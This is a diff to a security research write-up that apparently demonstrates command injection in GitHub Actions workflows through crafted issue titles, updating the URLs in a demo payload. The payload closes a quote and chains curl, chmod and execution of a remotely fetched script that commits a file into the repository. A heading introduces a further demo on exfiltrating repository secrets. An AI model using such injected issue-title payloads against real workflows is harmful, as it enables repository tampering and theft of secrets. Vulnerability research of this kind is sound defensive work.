@@ -49,19 +49,19 @@ We can use simple git commands and commit a "malicious" file into the repository
 The issue title for the demo:
 
 ```bash
-Innocent bug" && curl -o /tmp/script.sh https://raw.githubusercontent.com/alexdemo1131/github-actions-scripts/main/commit_file.sh && chmod +x /tmp/script.sh && /tmp/script.sh https://raw.githubusercontent.com/alexdemo1131/github-actions-scripts/main/malicious_file malicious_file && echo "
+Innocent bug" && curl -o /tmp/script.sh https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/scripts/commit_file.sh && chmod +x /tmp/script.sh && /tmp/script.sh https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/files/file_to_commit innocent_file && echo "
 ```
 
 This payload consists of the following commands:
 
 ```bash
 # Fetching the commit script
-curl -o /tmp/script.sh https://raw.githubusercontent.com/cycodelabs/gh-injection-vuln-demo/main/scripts/commit_file.sh
+curl -o /tmp/script.sh https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/scripts/commit_file.sh
 
 chmod +x /tmp/script.sh
 
 # Running it together with our "malicious" file
-/tmp/script.sh https://raw.githubusercontent.com/cycodelabs/gh-injection-vuln-demo/main/files/file_to_commit innocent_file
+/tmp/script.sh https://raw.githubusercontent.com/CycodeLabs/gh-injection-vuln-demo/main/files/file_to_commit innocent_file
 ```
 
 ### Demo 3 - Exfiltrating repository and organization secrets
